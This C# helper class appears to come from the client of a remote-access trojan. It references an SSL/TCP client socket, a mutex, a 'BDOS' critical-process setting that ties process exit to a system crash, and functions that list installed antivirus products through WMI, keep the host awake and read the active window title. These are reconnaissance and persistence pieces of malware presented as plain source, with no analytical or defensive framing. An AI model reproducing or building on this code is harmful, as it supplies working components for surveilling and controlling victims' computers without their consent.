using Client.Connection;
using System;
using System.Collections.Generic;
using System.Management;
using System.Security.Principal;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using static Client.Helper.NativeMethods;
using System.Text;
using System.IO;
using System.Windows.Forms;
using System.Threading;

namespace Client.Helper
{
    public static class Methods
    {
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static void ClientOnExit()
        {
            try
            {
                if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
                    ProcessCritical.Exit();
                MutexControl.CloseMutex();
                ClientSocket.SslClient?.Close();
                ClientSocket.TcpClient?.Close();
            }
            catch { }
        }

        public static string Antivirus()
        {
            try
            {
                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    List<string> av = new List<string>();
                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                    {
                        av.Add(searchResult["displayName"].ToString());
                    }
                    if (av.Count == 0) return "N/A";
                    return string.Join(", ", av.ToArray());
                }
            }
            catch
            {
                return "N/A";
            }
        }

        public static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }


        public static void PreventSleep()
        {
            try
            {
                SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED | EXECUTION_STATE.ES_CONTINUOUS | EXECUTION_STATE.ES_DISPLAY_REQUIRED);
            }
            catch { }
        }

        public static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                StringBuilder buff = new StringBuilder(nChars);
                IntPtr handle = GetForegroundWindow();
                if (GetWindowText(handle, buff, nChars) > 0)
                {
                    return buff.ToString();
                }
            }
            catch { }
            return "";
        }
    }
}
